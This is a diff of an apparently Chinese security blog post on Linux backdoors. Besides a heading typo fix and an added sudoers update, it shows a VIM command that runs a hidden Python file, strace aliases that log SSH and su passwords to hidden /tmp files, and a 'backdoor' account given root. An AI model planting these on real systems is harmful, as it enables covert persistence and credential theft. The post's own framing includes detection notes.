@@ -55,7 +55,7 @@
 <h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>pam后门通常是指pam源码包修改重编译替换。<br>推荐阅读:<a href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a><br>总体和前面OpenSSH源码植入代码重新打包的感觉很像，而且更加繁琐。校验方式也是和SSH校验一样的，官方校验。</p>
 <h2 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h2><p>命令：<br><code>$(nohup vim -E -c &quot;pyfile door.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f door.py</code><br>试了试感觉异常的不好用，所以也不写了。</p>
 <h3 id="排查方式-2"><a href="#排查方式-2" class="headerlink" title="排查方式"></a>排查方式</h3><p>检测对应vim进程号虚拟目录的map文件是否有python字符。(是否不够靠谱?)</p>
-<h2 id="stace记录后门"><a href="#stace记录后门" class="headerlink" title="stace记录后门"></a>stace记录后门</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+<h2 id="strace记录后门"><a href="#strace记录后门" class="headerlink" title="strace记录后门"></a>strace记录后门</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
 <p>使用了一下感觉还行？主要是简单，但log文件有点太大了。</p>
 <p>按理说su命令也可以做类似操作，但实际不行:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias su&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.su.log -e read,write,connect -s 2048 su&#39;</span><br></pre></td></tr></table></figure>
@@ -111,6 +111,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ sudo cat &#x2F;etc&#x2F;passwd</span><br><span class="line">[sudo] u111 的密码：</span><br><span class="line">u111 不在 sudoers 文件中。此事将被报告。</span><br></pre></td></tr></table></figure>
 <p>但我<code>su</code>能直接切到root权限，然后就正常了，不太明白但暂时就这样把:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:10:53]</span><br><span class="line">$ ssh backdoor@10.211.55.12</span><br><span class="line">backdoor@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:09:14 2020 from 10.211.55.2</span><br><span class="line">[u111@CentOS7 ~]$ whoami</span><br><span class="line">u111</span><br><span class="line">[u111@CentOS7 ~]$ su</span><br><span class="line">密码：</span><br><span class="line">[root@CentOS7 u111]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>————20201209update</p>
+<p>犯了一个缺乏运维基础知识的错…su和sudo当然不一样<br>sudo用不了是因为没在<code>/etc/sudoers</code>文件中配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root	ALL&#x3D;(ALL) 	ALL</span><br><span class="line">u111	ALL&#x3D;(ALL) 	ALL</span><br></pre></td></tr></table></figure>
 
 <h4 id="Way2"><a href="#Way2" class="headerlink" title="Way2"></a>Way2</h4><p>用脚本生成密码:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;678233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;</span><br></pre></td></tr></table></figure>
